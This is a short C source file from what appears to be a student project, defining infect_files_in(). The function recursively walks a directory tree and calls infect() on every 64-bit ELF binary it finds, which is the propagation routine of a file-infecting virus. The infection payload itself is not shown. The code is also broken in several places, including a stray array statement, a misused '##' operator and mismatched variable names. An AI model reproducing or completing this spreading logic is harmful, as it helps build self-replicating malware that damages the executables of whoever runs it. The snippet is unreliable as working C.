/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   file_iterator.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/04 04:11:06 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

void		infect_files_in(const char *path)
{
	path[MAXPATHLEN];

	DIR		*dirp = opendir(path);
	struct dirent	*file;

	while ((file = readdir(dirp)))
	{
		filepath = path ## file->d_name;
		if (file->d_type == DT_DIR)
			infect_files_in(file_path);
		else if (elf64identifier(file_path))
			infect(file_path);
	}
	closedir(dirp);
}
